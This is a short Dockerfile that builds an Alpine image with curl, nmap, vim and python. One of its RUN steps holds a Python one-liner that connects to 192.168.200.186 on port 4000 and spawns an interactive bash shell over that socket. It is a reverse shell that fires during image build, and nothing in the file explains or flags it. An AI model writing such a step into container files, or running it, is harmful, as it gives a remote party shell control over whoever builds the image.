FROM alpine:3.7
RUN apk add --no-cache curl nmap vim python
RUN python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.200.186",4000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
ENTRYPOINT ["sh"]
